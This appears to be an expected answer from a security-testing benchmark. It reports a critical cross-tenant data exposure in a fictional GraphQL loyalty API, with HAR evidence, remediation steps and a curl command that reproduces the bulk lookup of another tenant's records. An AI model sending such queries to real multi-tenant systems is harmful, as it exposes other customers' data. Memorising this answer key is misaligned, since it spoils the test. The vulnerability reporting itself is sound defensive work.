# Expected Response

## System
- Domain: Retail / Loyalty Programme
- System: RewardCore Loyalty API
- Example ID: GQL-0173

## Priority Findings

### Finding 1: Retail Loyalty — Single GraphQL Endpoint Exposes Cross-Tenant Loyalty Data via Bulk Lookup (Pattern 9.1)
**Severity:** Critical
**Category:** GraphQL Platform / Single Endpoint Vulnerability

**Summary:**
Per §5.0 (Pattern 9.1 — GraphQL single endpoint vulnerabilities): The unified GraphQL endpoint does not enforce per-operation tenant isolation. An attacker from `tenant-d49b` queried `bulkResourceLookup(ids: ["R-2173", "R-1173", "R-3173"])` via the single endpoint and received loyalty programme data belonging to `tenant-6f52`, including `CONFIDENTIAL-d49b6f52`. In Retail / Loyalty, this exposes customer points balances, redemption history, and promotional campaign data.

**Evidence from HAR:**
- Request: `POST https://api.rewardcore-loyalty-a.example.com/graphql` (2026-04-13)
- JWT `x-tenant-id`: `tenant-d49b`
- Query: `bulkResourceLookup(ids: ["R-2173", "R-1173", "R-3173"]) { resourceId tenantId data { sensitiveField } }`
- Response `200 OK`: `tenantId: "tenant-6f52"`, `ownerId: "other-user-d49b6f52"`, `sensitiveField: "CONFIDENTIAL-d49b6f52"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-d49b6f52`

**Evidence Map:**

| Artifact | Location | Finding |
|---|---|---|
| context.txt §5.0 | Pattern 9.1 | Single endpoint, no per-op tenant guard |
| HAR request | ids array | R-2173, R-1173, R-3173 (cross-tenant) |
| HAR response | tenantId | tenant-6f52 loyalty data returned |
| HAR response | sensitiveField | CONFIDENTIAL-d49b6f52 |

## Steps to Reproduce

### Step 1 — Bulk loyalty lookup via single endpoint (HAR)
```bash
curl -s -X POST https://api.rewardcore-loyalty-a.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-d49b" \
  -d '{"query": "query { bulkResourceLookup(ids: [\"R-2173\", \"R-1173\", \"R-3173\"]) { resourceId tenantId data { sensitiveField } } }"}'
```
**Vulnerable:** `tenant-6f52` loyalty data returned. **Secure:** Only `tenant-d49b` data or FORBIDDEN.

## Remediation
1. Per-operation tenant guard on the single endpoint.
2. Bulk lookup: `WHERE resource_id = ANY($ids) AND tenant_id = $jwt.tenantId`.
3. Disable GraphQL introspection.
4. Redis cache key: `resource:{tenantId}:{resourceId}`.
